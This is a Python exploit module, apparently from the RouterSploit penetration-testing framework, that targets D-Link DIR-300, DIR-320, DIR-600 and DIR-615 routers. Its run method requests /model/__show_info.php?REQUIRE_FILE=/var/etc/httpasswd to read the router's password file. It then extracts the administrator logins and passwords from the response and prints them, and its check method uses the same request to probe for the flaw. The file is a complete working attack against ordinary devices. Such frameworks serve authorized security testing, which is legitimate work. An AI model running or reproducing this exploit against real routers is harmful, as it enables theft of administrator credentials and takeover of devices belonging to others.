import re

from routersploit import (
    exploits,
    print_error,
    print_success,
    print_table,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for D-Link DIR-300, DIR-320, DIR-600, DIR-615 Information Disclosure vulnerability.
    If the target is vulnerable it allows to read credentials for administrator."
    """
    __info__ = {
        'name': 'D-Link DIR-300 & DIR-320 & DIR-600 & DIR-615 Info Disclosure',
        'description': 'Module explois information disclosure vulnerability in D-Link DIR-300, DIR-320, DIR-600,'
                       'DIR-615 devices. It is possible to retrieve sensitive information such as credentials.',
        'authors': [
            'tytusromekiatomek <tytusromekiatomek[at]inbox.com>',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
            'Aleksandr Mikhaylov <chelaxe[at]gmail.com>',  # routersploit module
        ],
        'references': [
            'http://seclists.org/bugtraq/2013/Dec/11'
        ],
        'devices': [
            'D-Link DIR-300 (all)',
            'D-Link DIR-320 (all)',
            'D-Link DIR-600 (all)',
            'D-Link DIR-615 (fw 4.0)',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port

    def run(self):
        url = "{}:{}/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return

        creds = re.findall("\n\t\t\t(.+?):(.+?)\n\n\t\t\t", response.text)

        if len(creds):
            print_success("Credentials found!")
            headers = ("Login", "Password")
            print_table(headers, *creds)
        else:
            print_error("Credentials could not be found")

    @mute
    def check(self):
        url = "{}:{}/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        creds = re.findall("\n\t\t\t(.+?):(.+?)\n\n\t\t\t", response.text)

        if len(creds):
            return True  # target is vulnerable

        return False  # target is not vulnerable
